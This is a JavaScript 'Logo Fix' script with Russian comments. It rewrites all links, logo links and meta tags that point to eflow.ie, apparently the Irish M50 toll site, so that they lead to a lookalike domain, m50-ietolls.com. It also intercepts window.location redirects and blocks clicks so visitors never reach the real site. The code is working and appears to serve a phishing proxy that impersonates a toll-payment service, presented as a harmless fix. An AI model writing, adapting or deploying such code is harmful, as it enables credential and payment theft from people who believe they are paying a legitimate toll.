/**
 * Logo Fix Script - исправляет ссылки на eflow.ie
 * Этот файл загружается отдельно от HTML и работает независимо от кеша
 * Version: 2.0 - 21.01.2026
 */
(function() {
  'use strict';
  
  // Конфигурация
  const TARGET_DOMAIN = 'eflow.ie';
  const PROXY_ORIGIN = 'https://m50-ietolls.com';
  
  console.log('[LogoFix] Initializing v2.0...');
  
  /**
   * Исправить все ссылки на странице
   */
  function fixAllLinks() {
    let fixed = 0;
    
    // Найти все ссылки с eflow.ie
    const links = document.querySelectorAll('a[href*="eflow.ie"], a[href*="eFlow.ie"]');
    links.forEach(function(link) {
      const oldHref = link.href;
      let newHref = oldHref;
      
      // Заменить домен
      newHref = newHref.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
      newHref = newHref.replace(/\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN.replace('https:', ''));
      
      if (newHref !== oldHref) {
        link.href = newHref;
        link.setAttribute('data-fixed', 'true');
        fixed++;
        console.log('[LogoFix] Fixed link:', oldHref, '->', newHref);
      }
    });
    
    return fixed;
  }
  
  /**
   * Специальное исправление для логотипа
   */
  function fixLogo() {
    // Селекторы для логотипа
    const logoSelectors = [
      'a.site-logo',
      'a[rel="home"]',
      'a[title="Home"]',
      '.navbar-brand a',
      'header a:has(img)',
      'footer a:has(img[alt="Home"])',
      'a:has(img[src*="logo"])'
    ];
    
    let fixed = 0;
    
    logoSelectors.forEach(function(selector) {
      try {
        const logos = document.querySelectorAll(selector);
        logos.forEach(function(logo) {
          const href = logo.getAttribute('href');
          
          // Проверить, ведёт ли на eflow.ie
          if (href && (href.includes('eflow.ie') || href === 'http://eflow.ie/' || href === 'https://eflow.ie/')) {
            // Заменить href
            logo.href = PROXY_ORIGIN + '/';
            logo.setAttribute('data-logo-fixed', 'true');
            
            // Удалить onclick если есть
            logo.removeAttribute('onclick');
            
            // Предотвратить переход
            logo.addEventListener('click', function(e) {
              e.preventDefault();
              e.stopPropagation();
              window.location.href = PROXY_ORIGIN + '/';
            }, true);
            
            fixed++;
            console.log('[LogoFix] Fixed logo:', href, '->', PROXY_ORIGIN + '/');
          }
        });
      } catch (e) {
        // Игнорируем ошибки селекторов :has в старых браузерах
      }
    });
    
    return fixed;
  }
  
  /**
   * Исправить canonical и shortlink meta теги
   */
  function fixMetaTags() {
    let fixed = 0;
    
    // Canonical
    const canonical = document.querySelector('link[rel="canonical"]');
    if (canonical && canonical.href && canonical.href.includes('eflow.ie')) {
      canonical.href = canonical.href.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
      fixed++;
    }
    
    // Shortlink
    const shortlink = document.querySelector('link[rel="shortlink"]');
    if (shortlink && shortlink.href && shortlink.href.includes('eflow.ie')) {
      shortlink.href = shortlink.href.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
      fixed++;
    }
    
    // Alternate
    const alternates = document.querySelectorAll('link[rel="alternate"]');
    alternates.forEach(function(alt) {
      if (alt.href && alt.href.includes('eflow.ie')) {
        alt.href = alt.href.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
        fixed++;
      }
    });
    
    return fixed;
  }
  
  /**
   * Перехват window.location
   */
  function interceptLocation() {
    // Сохранить оригинальные методы
    const originalAssign = window.location.assign;
    const originalReplace = window.location.replace;
    
    // Функция исправления URL
    function fixUrl(url) {
      if (typeof url === 'string') {
        return url.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
      }
      return url;
    }
    
    // Переопределить assign
    window.location.assign = function(url) {
      return originalAssign.call(window.location, fixUrl(url));
    };
    
    // Переопределить replace
    window.location.replace = function(url) {
      return originalReplace.call(window.location, fixUrl(url));
    };
    
    console.log('[LogoFix] Location methods intercepted');
  }
  
  /**
   * Наблюдатель за DOM изменениями
   */
  function setupObserver() {
    const observer = new MutationObserver(function(mutations) {
      let needsFix = false;
      
      mutations.forEach(function(mutation) {
        if (mutation.type === 'childList') {
          mutation.addedNodes.forEach(function(node) {
            if (node.nodeType === 1) { // Element
              if (node.tagName === 'A' && node.href && node.href.includes('eflow.ie')) {
                needsFix = true;
              }
              if (node.querySelectorAll) {
                const links = node.querySelectorAll('a[href*="eflow.ie"]');
                if (links.length > 0) needsFix = true;
              }
            }
          });
        }
      });
      
      if (needsFix) {
        fixAllLinks();
        fixLogo();
      }
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
    
    console.log('[LogoFix] DOM observer started');
  }
  
  /**
   * Главная функция запуска
   */
  function init() {
    console.log('[LogoFix] Running initial fix...');
    
    // Исправить существующие элементы
    const linksFixed = fixAllLinks();
    const logosFixed = fixLogo();
    const metaFixed = fixMetaTags();
    
    console.log('[LogoFix] Initial fix complete:', {
      links: linksFixed,
      logos: logosFixed,
      meta: metaFixed
    });
    
    // Перехватить location
    interceptLocation();
    
    // Запустить наблюдатель
    if (document.body) {
      setupObserver();
    }
    
    // Повторить через 500ms для динамического контента
    setTimeout(function() {
      fixAllLinks();
      fixLogo();
    }, 500);
    
    // И ещё раз через 2 секунды
    setTimeout(function() {
      fixAllLinks();
      fixLogo();
    }, 2000);
  }
  
  // Запуск
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  
  // Также запустить при полной загрузке
  window.addEventListener('load', function() {
    fixAllLinks();
    fixLogo();
  });
  
})();
